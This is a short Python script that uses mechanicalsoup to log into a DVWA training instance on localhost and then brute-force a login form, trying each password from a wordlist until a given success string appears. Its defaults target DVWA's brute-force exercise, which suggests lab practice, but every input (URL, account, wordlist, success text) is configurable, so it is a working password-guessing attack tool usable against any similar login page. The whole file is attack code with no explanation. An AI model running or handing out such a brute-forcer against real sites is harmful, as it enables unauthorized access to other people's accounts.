import mechanicalsoup
from termcolor import colored

browser = mechanicalsoup.StatefulBrowser()

url = input('[+] Enter Login URL: ') or "http://localhost/dvwa/login.php"
browser.open(url)

LoginUser = input('[+] Enter Username For The Login: ') or "admin"
LoginPass = input('[+] Enter Password For The Login: ') or "password"

browser.select_form('form[action="login.php"]')
browser["username"] = LoginUser
browser["password"] = LoginPass

browser.submit_selected()

link = input('[+] Enter Page URL: ') or "vulnerabilities/brute/"
browser.follow_link(link)

username = input('[+] Enter Username For The Account To Bruteforce: ') or "admin"

password_file = input('[+] Enter Password File To Use: ') or "PassFile.txt"

login_succeed_string = input('[+] Enter String That Occurs When Login Succeeds: ') or "Welcome to the password protected area"

security_level = input('[+] Enter Security Level Of The Challenge: ') or "low"

cookiejar = browser.get_cookiejar()
for cookie in cookiejar:
    if cookie.name == "security":
        cookie.value = security_level
        break
browser.set_cookiejar(cookiejar)

def brute_force():
    for password in passwords:
        password = password.strip()
        browser.select_form('form[action="#"]')
        browser["username"] = username
        browser["password"] = password
        response = browser.submit_selected()
        if login_succeed_string in response.text:
            print(colored(('[+] Found Username: ==> ' + username), 'green'))
            print(colored(('[+] Found Password: ==> ' + password), 'green'))
            break
        else:
            browser.follow_link(link)
            pass


with open(password_file, 'r') as passwords:
    brute_force()